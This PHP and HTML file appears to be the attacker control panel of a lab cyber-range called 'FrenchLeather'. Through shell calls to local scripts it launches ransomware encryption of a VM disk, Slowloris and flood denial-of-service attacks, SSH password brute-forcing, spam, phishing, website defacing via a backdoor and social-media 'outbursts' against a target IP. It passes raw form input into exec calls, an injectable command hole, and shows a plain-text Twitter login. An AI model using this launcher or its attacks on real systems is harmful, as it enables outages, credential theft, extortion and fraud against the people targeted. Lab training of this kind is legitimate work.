<?php
	session_start();

	if (file_exists($_SESSION['outputFileSSH'])) {
		$_SESSION['ssh']['found'] = true;
		$_SESSION['ssh']['active'] = false;
	}
	else {
		$_SESSION['ssh']['found'] = false;
	}

	if (!isset($_SESSION['nmap'])) {
		$_SESSION['localIP'] = shell_exec("ip -o -f inet addr show | awk '/scope global/ {print $4}'");
		$localIP = $_SESSION['localIP'];
		$_SESSION['nmap'] = shell_exec("nmap -sP $localIP");
	}

	if (isset($_POST['clean'])) {
		session_destroy();
		header("Refresh:0");
	}
	else if (isset($_POST['setIP'])) {
		$_SESSION['targetIP'] = $_POST['targetIP'];
	}
	else if (isset($_SESSION['targetIP'])) {
		if (isset($_POST['ransomware'])) {
			$_SESSION['ransomware']['exists'] = true;
			if ($_SESSION['ransomware']['active']) {
				$_SESSION['ransomware']['active'] = false;

				$_SESSION['runnerIP'] = $_POST['runnerIP'];
				$_SESSION['runnerUsername'] = $_POST['runnerUsername'];
				$_SESSION['runnerPass'] = $_POST['runnerPass'];
				$_SESSION['vbPath'] = $_POST['vbPath'];
				$_SESSION['passFile'] = $_POST['passFile'];

				$command = '/home/attacker/attacks/ransomware/decrypt.py';
				$ip = $_SESSION['runnerIP'];
				$user = $_SESSION['runnerUsername'];
				$password = $_SESSION['runnerPass'];
				$diskPath = $_SESSION['vbPath'];
				$passFile = $_SESSION['passFile'];
				$cmd = "$command $ip -u $user -p $password -d \"$diskPath\" -P \"$passFile\"";

				exec("$cmd 2>&1", $_SESSION['ransomware']['output'], $_SESSION['ransomware']['code']);
			}
			else {
				$_SESSION['ransomware']['active'] = true;

				$_SESSION['runnerIP'] = $_POST['runnerIP'];
				$_SESSION['runnerUsername'] = $_POST['runnerUsername'];
				$_SESSION['runnerPass'] = $_POST['runnerPass'];
				$_SESSION['vbPath'] = $_POST['vbPath'];
				$_SESSION['passFile'] = $_POST['passFile'];

				$command = '/home/attacker/attacks/ransomware/ransomware.py';
				$ip = $_SESSION['runnerIP'];
				$user = $_SESSION['runnerUsername'];
				$password = $_SESSION['runnerPass'];
				$diskPath = $_SESSION['vbPath'];
				$passFile = $_SESSION['passFile'];
				$cmd = "$command $ip -u $user -p $password -d \"$diskPath\" -P \"$passFile\"";

				exec("$cmd 2>&1", $_SESSION['ransomware']['output'], $_SESSION['ransomware']['code']);
			}
		}
		else if (isset($_POST['slowloris'])) {
			$_SESSION['slowloris']['exists'] = true;
			if ($_SESSION['slowloris']['active']) {
				$pid = $_SESSION['slowloris']['pid'];

				shell_exec("kill -9 $pid");

				$_SESSION['slowloris']['code'][] = 0;
				$_SESSION['slowloris']['output'][] = "Slowloris attack ended";
				$_SESSION['slowloris']['active'] = false;
			}
			else {
				$prog = '/home/attacker/attacks/dos/slowloris.py';
				$ip = $_SESSION['targetIP'];
				$cmd = "$prog $ip";

				$_SESSION['slowloris']['pid'] = exec("$cmd > /dev/null 2>&1 & echo $!;", $output);

				$_SESSION['slowloris']['code'][] = 0;
				$_SESSION['slowloris']['output'][] = "Slowloris attack started";
				$_SESSION['slowloris']['active'] = true;
			}
		}
		else if (isset($_POST['ping'])) {
			$_SESSION['ping']['exists'] = true;
			if ($_SESSION['ping']['active']) {
				$pid = $_SESSION['ping']['pid'];

				shell_exec("pkill -TERM -P $pid");

				$_SESSION['ping']['code'][] = 0;
				$_SESSION['ping']['output'][] = "Ping of Death attack ended";
				$_SESSION['ping']['active'] = false;
			}
			else {
				$prog = '/home/attacker/attacks/dos/ping.sh';
				$ip = $_SESSION['targetIP'];
				$cmd = "$prog $ip";

				$_SESSION['ping']['pid'] = exec("$cmd > /dev/null 2>&1 & echo $!;", $output);

				$_SESSION['ping']['code'][] = 0;
				$_SESSION['ping']['output'][] = "Ping of Death attack started";
				$_SESSION['ping']['active'] = true;
			}
		}
		else if (isset($_POST['udp_flood'])) {
			$_SESSION['udp_flood']['exists'] = true;
			if ($_SESSION['udp_flood']['active']) {
				$pid = $_SESSION['udp_flood']['pid'];

				shell_exec("pkill -TERM -P $pid");

				$_SESSION['udp_flood']['code'][] = 0;
				$_SESSION['udp_flood']['output'][] = "UDP Flood attack ended";
				$_SESSION['udp_flood']['active'] = false;
			}
			else {
				$prog = '/home/attacker/attacks/dos/udp_flood.sh';
				$ip = $_SESSION['targetIP'];
				$cmd = "$prog $ip 80";

				$_SESSION['udp_flood']['pid'] = exec("$cmd > /dev/null 2>&1 & echo $!;", $output);

				$_SESSION['udp_flood']['code'][] = 0;
				$_SESSION['udp_flood']['output'][] = "UDP Flood attack started";
				$_SESSION['udp_flood']['active'] = true;
			}
		}
		else if (isset($_POST['tcp_flood'])) {
			$_SESSION['tcp_flood']['exists'] = true;
			if ($_SESSION['tcp_flood']['active']) {
				$pid = $_SESSION['tcp_flood']['pid'];

				shell_exec("pkill -TERM -P $pid");

				$_SESSION['tcp_flood']['code'][] = 0;
				$_SESSION['tcp_flood']['output'][] = "UDP Flood attack ended";
				$_SESSION['tcp_flood']['active'] = false;
			}
			else {
				$prog = '/home/attacker/attacks/dos/tcp_flood.sh';
				$ip = $_SESSION['targetIP'];
				$cmd = "$prog $ip 80";

				$_SESSION['tcp_flood']['pid'] = exec("$cmd > /dev/null 2>&1 & echo $!;", $output);

				$_SESSION['tcp_flood']['code'][] = 0;
				$_SESSION['tcp_flood']['output'][] = "TCP Flood attack started";
				$_SESSION['tcp_flood']['active'] = true;
			}
		}
		else if (isset($_POST['ssh'])) {
			$_SESSION['ssh']['exists'] = true;
			if ($_SESSION['ssh']['active']) {
				$pid = $_SESSION['ssh']['pid'];

				shell_exec("kill -9 $pid");

				$_SESSION['ssh']['code'][] = 0;
				$_SESSION['ssh']['output'][] = "SSH attack killed";
				$_SESSION['ssh']['active'] = false;
			}
			else {
				$_SESSION['passwordList'] = $_POST['passwordList'];
				$_SESSION['username'] = $_POST['username'];
				$_SESSION['sshTarget'] = $_POST['sshTarget'];
				$_SESSION['outputFileSSH'] = '/home/attacker/tmp/credentials.txt';

				$prog = '/home/attacker/attacks/ssh/connect_ssh.py';
				$ip = $_SESSION['targetIP'];
				$passwordList = $_SESSION['passwordList'];
				$username = $_SESSION['username'];
				$port = $_SESSION['sshTarget'];
				$output = $_SESSION['outputFileSSH'];
				$cmd = "$prog $ip -p $port -P $passwordList -u $username -o $output";

				$_SESSION['ssh']['pid'] = exec("$cmd > /dev/null 2>&1 & echo $!;", $output);

				$_SESSION['ssh']['code'][] = 0;
				$_SESSION['ssh']['output'][] = "SSH attack started. Credentials will be printed if found.";
				$_SESSION['ssh']['active'] = true;
			}
		}
		else if (isset($_POST['spam'])) {
			$_SESSION['spam']['exists'] = true;

			$_SESSION['from'] = $_POST['from'];
			$_SESSION['to'] = $_POST['to'];
			$_SESSION['subject'] = $_POST['subject'];
			$_SESSION['message'] = $_POST['message'];

			$command = '/home/attacker/attacks/spam/send_mail.py';
			$ip = $_SESSION['targetIP'];
			$from = $_SESSION['from'];
			$to = $_SESSION['to'];
			$subject = $_SESSION['subject'];
			$message = $_SESSION['message'];

			exec("$command $ip -f $from -t $to -s \"$subject\" -m \"$message\"  > /dev/null 2>&1 &");

			$_SESSION['spam']['code'][] = 0;
			$_SESSION['spam']['output'][] = "Done.";
		}
		else if (isset($_POST['blog'])) {
			$_SESSION['blog']['exists'] = true;

			$_SESSION['blogUser'] = $_POST['blogUser'];
			$_SESSION['blogPassword'] = $_POST['blogPassword'];
			$_SESSION['blogMessage'] = $_POST['blogMessage'];

			$command = '/home/attacker/attacks/spam/send_post.sh';
			$ip = $_SESSION['targetIP'];
			$blogUser = $_SESSION['blogUser'];
			$blogPassword = $_SESSION['blogPassword'];
			$blogMessage = $_SESSION['blogMessage'];
			$cmd = "$command $ip \"$blogUser\" \"$blogPassword\" \"$blogMessage\"";

			exec("$cmd 2>&1", $_SESSION['blog']['output'], $_SESSION['blog']['code']);
		}
		else if (isset($_POST['phishing'])) {
			$_SESSION['phishing']['exists'] = true;

			$command = '/home/attacker/attacks/phishing/phishing.py';
			$ip = $_SESSION['targetIP'];
			$localIP = $_SESSION['localIP'];

			exec("$command $ip -i $localIP > /dev/null 2>&1 &");

			$_SESSION['phishing']['code'][] = 0;
			$_SESSION['phishing']['output'][] = "Done.";
		}
		else if (isset($_POST['defacing'])) {
			$_SESSION['defacing']['exists'] = true;

			$command = '/home/attacker/attacks/defacing/backdoor.sh';
			$ip = $_SESSION['targetIP'];

			exec("$command $ip 2>&1", $_SESSION['defacing']['output'], $_SESSION['defacing']['code']);
		}
		else if (isset($_POST['mail'])) {
			$_SESSION['mail']['exists'] = true;

			$command = '/home/attacker/attacks/outburst/email_outburst.py';
			$ip = $_SESSION['targetIP'];

			exec("$command $ip > /dev/null 2>&1 &");

			$_SESSION['mail']['code'][] = 0;
			$_SESSION['mail']['output'][] = "Done.";
		}
		else if (isset($_POST['social'])) {
			$_SESSION['social']['exists'] = true;

			$command = '/home/attacker/attacks/outburst/social_outburst.sh';
			$ip = $_SESSION['targetIP'];

			exec("$command $ip > /dev/null 2>&1 &");

			$_SESSION['social']['code'][] = 0;
			$_SESSION['social']['output'][] = "Done.";
		}
	}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>@Attacker</title>
		<link href="bootstrap-5.0.2-dist/css/bootstrap.min.css" rel="stylesheet">
		<script src="bootstrap-5.0.2-dist/js/bootstrap.bundle.min.js"></script>
	</head>
	<body>
		<div class="container">
			<div class="row align-items-start">
				<div id="log" class="col w-50"> <!-- Logs -->
					<h1 class="text-center">Logs</h1>
					<div> <!-- Attacker IP -->
						<?php if (isset($_SESSION['localIP'])) { ?>
							<h2>Attacker IP address</h2>
							<pre><?= $_SESSION['localIP'] ?></pre>
						<?php } ?>
					</div>
					<div> <!-- SI schema -->
						<h2>SI schema</h2>
						<a href="img/si.png"><img src="img/si.png" width="100%"></a>
					</div>
					<div> <!-- Nmap output -->
						<?php if (isset($_SESSION['nmap'])) { ?>
							<h2>Nmap output</h2>
							<pre><?= $_SESSION['nmap'] ?></pre>
							<p>One IP adress is the attacker's one, another one is yours (the computer running virtualbox). The last one is the gateway's one. Identify it and write it down in the <em>Target IP</em> field.</p>
						<?php } ?>
					</div>
					<div> <!-- Target IP -->
						<?php if (isset($_SESSION['targetIP'])) { ?>
							<h2>Target IP address</h2>
							<pre><?= $_SESSION['targetIP'] ?></pre>
						<?php } ?>
					</div>
					<div> <!-- Ransomware output -->
						<?php if ($_SESSION['ransomware']['exists']) { ?>
							<h2>Ransomware output</h2>
							<pre><?= $_SESSION['ransomware']['code'] ?></pre>
							<pre><?= var_dump($_SESSION['ransomware']['output']) ?></pre>
						<?php } ?>
					</div>
					<div> <!-- DoS output -->
						<?php if ($_SESSION['slowloris']['exists'] ||
								  $_SESSION['ping']['exists'] ||
								  $_SESSION['udp_flood']['exists'] ||
								  $_SESSION['tcp_flood']['exists']) { ?>
							<div> <!-- Slowloris output -->
								<?php if ($_SESSION['slowloris']['exists']) { ?>
									<h3>Slowloris output</h3>
									<?php for ($i = 0; $i < count($_SESSION['slowloris']['code']); ++$i) { ?>
										<pre><?= $_SESSION['slowloris']['code'][$i] ?> : <?= $_SESSION['slowloris']['output'][$i] ?></pre>
									<?php } ?>
								<?php } ?>
							</div>
							<div> <!-- Ping of Death output -->
								<?php if ($_SESSION['ping']['exists']) { ?>
									<h3>Ping of Death output</h3>
									<?php for ($i = 0; $i < count($_SESSION['ping']['code']); ++$i) { ?>
										<pre><?= $_SESSION['ping']['code'][$i] ?> : <?= $_SESSION['ping']['output'][$i] ?></pre>
									<?php } ?>
								<?php } ?>
							</div>
							<div> <!-- UDP Flood output -->
								<?php if ($_SESSION['udp_flood']['exists']) { ?>
									<h3>UDP Flood output</h3>
									<?php for ($i = 0; $i < count($_SESSION['udp_flood']['code']); ++$i) { ?>
										<pre><?= $_SESSION['udp_flood']['code'][$i] ?> : <?= $_SESSION['udp_flood']['output'][$i] ?></pre>
									<?php } ?>
								<?php } ?>
							</div>
							<div> <!-- TCP Flood output -->
								<?php if ($_SESSION['tcp_flood']['exists']) { ?>
									<h3>TCP Flood output</h3>
									<?php for ($i = 0; $i < count($_SESSION['tcp_flood']['code']); ++$i) { ?>
										<pre><?= $_SESSION['tcp_flood']['code'][$i] ?> : <?= $_SESSION['tcp_flood']['output'][$i] ?></pre>
									<?php } ?>
								<?php } ?>
							</div>
						<?php } ?>
					</div>
					<div> <!-- SSH output -->
						<?php if ($_SESSION['ssh']['exists']) { ?>
							<h2>SSH output</h2>
							<?php for ($i = 0; $i < count($_SESSION['ssh']['code']); ++$i) { ?>
								<pre><?= $_SESSION['ssh']['code'][$i] ?> : <?= $_SESSION['ssh']['output'][$i] ?></pre>
							<?php } ?>
							<?php if ($_SESSION['ssh']['found']) { ?>
								Credentials found :
								<pre><?= file_get_contents($_SESSION['outputFileSSH']) ?></pre>
							<?php } ?>
						<?php } ?>
					</div>
					<div> <!-- Spamming output -->
						<?php if ($_SESSION['spam']['exists']) { ?>
							<h2>Spamming output</h2>
							<?php for ($i = 0; $i < count($_SESSION['spam']['code']); ++$i) { ?>
								<pre><?= $_SESSION['spam']['code'][$i] ?> : <?= $_SESSION['spam']['output'][$i] ?></pre>
							<?php } ?>
						<?php } ?>
					</div>
					<div> <!-- Blog output -->
						<?php if ($_SESSION['blog']['exists']) { ?>
							<h2>Defacing output</h2>
							<pre><?= $_SESSION['blog']['code'] ?></pre>
							<pre><?= var_dump($_SESSION['blog']['output']) ?></pre>
						<?php } ?>
					</div>
					<div> <!-- Phishing output -->
						<?php if ($_SESSION['phishing']['exists']) { ?>
							<h2>Phishing output</h2>
							<?php for ($i = 0; $i < count($_SESSION['phishing']['code']); ++$i) { ?>
								<pre><?= $_SESSION['phishing']['code'][$i] ?> : <?= $_SESSION['phishing']['output'][$i] ?></pre>
							<?php } ?>
						<?php } ?>
					</div>
					<div> <!-- Defacing output -->
						<?php if ($_SESSION['defacing']['exists']) { ?>
							<h2>Defacing output</h2>
							<pre><?= $_SESSION['defacing']['code'] ?></pre>
							<pre><?= var_dump($_SESSION['defacing']['output']) ?></pre>
						<?php } ?>
					</div>
					<div> <!-- Outbursts output -->
						<?php if ($_SESSION['mail']['exists'] || $_SESSION['social']['exists']) { ?>
							<h2>Outbursts output</h2>
							<div> <!-- Email -->
								<?php if ($_SESSION['mail']['exists']) { ?>
									<h3>Spamming output</h3>
									<?php for ($i = 0; $i < count($_SESSION['mail']['code']); ++$i) { ?>
										<pre><?= $_SESSION['mail']['code'][$i] ?> : <?= $_SESSION['mail']['output'][$i] ?></pre>
									<?php } ?>
								<?php } ?>
							</div>
							<div> <!-- Social output -->
								<?php if ($_SESSION['social']['exists']) { ?>
									<h3>Social output</h3>
									<?php for ($i = 0; $i < count($_SESSION['social']['code']); ++$i) { ?>
										<pre><?= $_SESSION['social']['code'][$i] ?> : <?= $_SESSION['social']['output'][$i] ?></pre>
									<?php } ?>
								<?php } ?>
							</div>
						<?php } ?>
					</div>
					<hr>
					<div> <!-- Clean -->
						<form action="index.php" method="post">
							<div class="m-3">
								<button type="submit" name="clean" class="btn btn-danger w-100">Clean</button>
							</div>
						</form>
					</div>
				</div>
				<div id="attack" class="col w-50">  <!-- Attacks -->
					<h1 class="text-center">Attacks</h1>
					<div> <!-- Refresh -->
						<form action="index.php" method="post">
							<div class="m-3">
								<button type="submit" class="btn btn-success w-100">Refresh</button>
							</div>
						</form>
					</div>
					<div> <!-- Set IP -->
						<form action="index.php" method="post">
							<div class="m-3">
								<div class="input-group">
									<span class="input-group-text">@</span>
									<input id="ip" class="form-control" name="targetIP" type="text" placeholder="Target IP" value="<?= $_SESSION['targetIP'] ?>" required>
								</div>
							</div>
							<div class="m-3">
								<button type="submit" name="setIP" class="btn btn-info w-100">Set</button>
							</div>
						</form>
					</div>
					<div> <!-- Denial of Service -->
						<h2>Denial of Service</h2>
						<?php if ($_SESSION['slowloris']['active'] ||
								  $_SESSION['ping']['active'] ||
								  $_SESSION['udp_flood']['active'] ||
								  $_SESSION['tcp_flood']['active']) { ?>
							<div class="text-success text-end">
								Running...
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<div class="m-3">
								<button
									type="submit"
									name="slowloris"
									class="btn <?php if ($_SESSION['slowloris']['active']) echo 'btn-danger'; else echo 'btn-primary'; ?>"
									title="<?php if ($_SESSION['slowloris']['active']) echo 'Kill'; else echo 'Run'; ?>"
									<?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?>
								>Slowloris</button>
								<button
									type="submit"
									name="ping"
									class="btn <?php if ($_SESSION['ping']['active']) echo 'btn-danger'; else echo 'btn-primary'; ?>"
									title="<?php if ($_SESSION['ping']['active']) echo 'Kill'; else echo 'Run'; ?>"
									<?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?>
								>Ping</button>
								<button
									type="submit"
									name="udp_flood"
									class="btn <?php if ($_SESSION['udp_flood']['active']) echo 'btn-danger'; else echo 'btn-primary'; ?>"
									title="<?php if ($_SESSION['udp_flood']['active']) echo 'Kill'; else echo 'Run'; ?>"
									<?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?>
								>UDP Flood</button>
								<button
									type="submit"
									name="tcp_flood"
									class="btn <?php if ($_SESSION['tcp_flood']['active']) echo 'btn-danger'; else echo 'btn-primary'; ?>"
									title="<?php if ($_SESSION['tcp_flood']['active']) echo 'Kill'; else echo 'Run'; ?>"
									<?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?>
								>TCP Flood</button>
							</div>
						</form>
					</div>
					<div> <!-- Ransomware -->
						<h2>Ransomware</h2>
						<div>
							<em>You need to start ssh service on the computer which is running VirtualBox to be able to connect with SHH to it :</em>
							<pre>sudo systemctl start ssh</pre>
						</div>
						<?php if ($_SESSION['ransomware']['active']) { ?>
							<div class="text-success text-end">
								Active
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<div class="m-3">
								<label for="runnerIP" class="form-label">VirtualBox-runner IP</label>
								<input id="runnerIP" class="form-control" name="runnerIP" type="text" placeholder="" value="<?= $_SESSION['runnerIP'] ?>" required>
							</div>
							<div class="m-3">
								<label for="runnerUsername" class="form-label">VirtualBox-runner login</label>
								<input id="runnerUsername" class="form-control" name="runnerUsername" type="text" placeholder="" value="<?= $_SESSION['runnerUsername'] ?>" required>
							</div>
							<div class="m-3">
								<label for="runnerPass" class="form-label">VirtualBox-runner password</label>
								<input id="runnerPass" class="form-control" name="runnerPass" type="password" placeholder="" value="<?= $_SESSION['runnerPass'] ?>" required>
							</div>
							<div class="m-3">
								<label for="vbPath" class="form-label">VirtualBox-runner disk path</label>
								<input id="vbPath" class="form-control" name="vbPath" type="text" placeholder="/home/username/VirtualBox VMs/FrenchLeather/debian-file/disk004.vdi" value="<?= $_SESSION['vbPath'] ?>" required>
							</div>
							<div class="m-3">
								<label for="passFile" class="form-label">VirtualBox-runner password file path</label>
								<input id="passFile" class="form-control" name="passFile" type="text" placeholder="/home/username/passFile.txt" value="<?= $_SESSION['passFile'] ?>" required>
							</div>
							<div class="m-3">
								<button type="submit" name="ransomware" class="btn <?php if ($_SESSION['ransomware']['active']) echo 'btn-danger'; else echo 'btn-primary'; ?> <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100">
									<?php if ($_SESSION['ransomware']['active']) { ?>
										Kill
									<?php } else { ?>
										Run
									<?php } ?>
								</button>
							</div>
						</form>
					</div>
					<div> <!-- SSH Brute Force -->
						<h2>SSH Brute Force</h2>
						<?php if ($_SESSION['ssh']['active'] || $_SESSION['ssh']['found']) { ?>
							<div class="text-success text-end">
								<?php if ($_SESSION['ssh']['found']) { ?>
									Donne.
								<?php } else { ?>
									Running...
								<?php } ?>
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<?php if (!$_SESSION['ssh']['active'] && !$_SESSION['ssh']['found']) { ?>
								<div class="m-3">
									<label for="sshTarget" class="form-label">SSH target</label>
									<select id="sshTarget" class="form-select" name="sshTarget">
										<option value="22">debian-file</option>
										<option value="22223">debian-web</option>
									</select>
								</div>
								<div class="m-3">
									<label for="username" class="form-label">Username</label>
									<input id="username" class="form-control" name="username" type="text" placeholder="admin" value="<?= $_SESSION['username'] ?>" required>
								</div>
								<div class="m-3">
									<label for="passwordList" class="form-label">Password list</label>
									<select id="passwordList" class="form-select" name="passwordList">
										<option value="/home/attacker/attacks/ssh/french_passwords_top1000.txt">French passwords top 1000</option>
										<option value="/home/attacker/attacks/ssh/french_passwords_top5000.txt">French passwords top 5000</option>
										<option value="/home/attacker/attacks/ssh/french_passwords_top20000.txt">French passwords top 20000</option>
										<option value="/home/attacker/attacks/ssh/10-million-password-list-top-1000000.txt">English passwords top 1000000</option>
									</select>
								</div>
							<?php } ?>
							<div class="m-3">
								<button type="submit" name="ssh" class="btn <?php if ($_SESSION['ssh']['active']) echo 'btn-danger'; else echo 'btn-primary'; ?> <?php if($_SESSION['ssh']['found']) echo 'disabled'; ?> <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100">
									<?php if ($_SESSION['ssh']['active']) { ?>
										Kill
									<?php } else { ?>
										Run
									<?php } ?>
								</button>
							</div>
						</form>
					</div>
					<div> <!-- Mail spamming -->
						<h2>Mail Spamming</h2>
						<?php if ($_SESSION['spam']['exists']) { ?>
							<div class="text-success text-end">
								Done.
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<div class="m-3">
								<div class="input-group">
									<span class="input-group-text">From</span>
									<input class="form-control" name="from" type="email" placeholder="admin@frenchleather.com" value="<?= $_SESSION['from'] ?>" required>
								</div>
							</div>
							<div class="m-3">
								<div class="input-group">
									<span class="input-group-text">To</span>
									<input class="form-control" name="to" type="email" placeholder="marie.curie@frenchleather.com" value="<?= $_SESSION['to'] ?>" required>
								</div>
							</div>
							<div class="m-3">
								<div class="input-group">
									<span class="input-group-text">Subject</span>
									<input class="form-control" name="subject" type="text" placeholder="[Alert] Veuillez cliquer sur ce lien de toute urgence" value="<?= $_SESSION['subject'] ?>" required>
								</div>
							</div>
							<div class="m-3">
								<div class="form-group">
									<label for="message">Message</label>
									<textarea id="message" class="form-control" name="message" rows="3" required><?= $_SESSION['message'] ?></textarea>
								</div>
							</div>
							<div class="m-3">
								<button type="submit" name="spam" class="btn btn-primary <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100">Run</button>
							</div>
						</form>
					</div>
					<div> <!-- Blog spamming -->
						<h2>Blog Spamming</h2>
						<?php if ($_SESSION['blog']['exists']) { ?>
							<div class="text-success text-end">
								Done.
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<div class="m-3">
								<div class="input-group">
									<span class="input-group-text">User</span>
									<input class="form-control" name="blogUser" type="text" placeholder="Anonymous" value="<?= $_SESSION['blogUser'] ?>" required>
								</div>
							</div>
							<div class="m-3">
								<div class="input-group">
									<span class="input-group-text">Password</span>
									<input class="form-control" name="blogPassword" type="password" placeholder="" value="<?= $_SESSION['blogPassword'] ?>" required>
								</div>
							</div>
							<div class="m-3">
								<div class="form-group">
									<label for="blogMessage">Message</label>
									<textarea id="blogMessage" class="form-control" name="blogMessage" rows="3" required><?= $_SESSION['blogMessage'] ?></textarea>
								</div>
							</div>
							<div class="m-3">
								<button type="submit" name="blog" class="btn btn-primary <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100">Run</button>
							</div>
						</form>
					</div>
					<div> <!-- Phishing -->
						<h2>Phishing</h2>
						<?php if ($_SESSION['phishing']['exists']) { ?>
							<div class="text-success text-end">
								Done.
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<div class="m-3">
								<button type="submit" name="phishing" class="btn btn-primary <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100 <?php if ($_SESSION['phishing']['exists']) echo 'disabled'; ?>">Run</button>
							</div>
						</form>
					</div>
					<div> <!-- Website Defacing -->
						<h2>Website Defacing</h2>
						<?php if ($_SESSION['defacing']['exists']) { ?>
							<div class="text-success text-end">
								Done.
							</div>
						<?php } ?>
						<form action="index.php" method="post">
							<div class="m-3">
								<button type="submit" name="defacing" class="btn btn-primary <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100 <?php if($_SESSION['defacing']['exists']) echo 'disabled'; ?>">Run</button>
							</div>
						</form>
					</div>
					<div> <!-- Outburst -->
						<h2>Outburst</h2>
						<div> <!-- Email outburst -->
							<h3>Email</h3>
							<?php if ($_SESSION['mail']['exists']) { ?>
								<div class="text-success text-end">
									Done.
								</div>
							<?php } ?>
							<form action="index.php" method="post">
								<div class="m-3">
									<button type="submit" name="mail" class="btn btn-primary <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100 <?php if ($_SESSION['mail']['exists']) echo 'disabled'; ?>">Run</button>
								</div>
							</form>
						</div>
						<div> <!-- Social network outburst -->
							<h3>Social network</h3>
							<?php if ($_SESSION['social']['exists']) { ?>
								<div class="text-success text-end">
									Done.
								</div>
							<?php } ?>
							<form action="index.php" method="post">
								<div class="m-3">
									<button type="submit" name="social" class="btn btn-primary <?php if (!isset($_SESSION['targetIP'])) echo 'disabled'; ?> w-100 <?php if ($_SESSION['social']['exists']) echo 'disabled'; ?>">Run</button>
								</div>
							</form>
						</div>
					</div>
					<div> <!-- Twitter -->
						<h2>Twitter</h2>
						<div>
							<p><a href="https://twitter.com/" target="_blank">Sign up with Google</a></p>
							<p>Login: <em>attacker554@gmail.com</em></p>
							<p>Password: <em>123password+</em></p>
						</div>
						<div class="text-center">
							<a href="https://twitter.com/frenchleathersa" target="_blank">Twitter</a>
						</div>
					</div>
				</div>
			</div>
		</div>
  	</body>
</html>
